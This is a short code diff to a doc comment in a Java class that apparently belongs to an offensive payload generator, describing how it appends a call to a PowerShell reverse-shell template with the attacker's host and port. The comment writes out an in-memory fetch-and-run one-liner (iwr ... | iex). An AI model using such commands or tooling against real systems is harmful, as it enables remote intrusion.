@@ -10,8 +10,9 @@ import java.nio.file.Path;
  * (Nishang's Invoke-PowerShellTcp and the like).
  *
  * The template only defines a function. This option copies it and appends a
- * call to that function with the chosen LHOST/LPORT baked in, so dot-sourcing
- * the produced file, ". .\name.ps1", fires the reverse shell immediately.
+ * call to that function with the chosen LHOST/LPORT baked in, so the produced
+ * file fires the reverse shell the moment it runs, whether it is fetched in
+ * memory (iwr http://ip:port/name.ps1 | iex) or dot-sourced (". .\\name.ps1").
  */
 public final class ScriptOption implements PayloadOption {
 
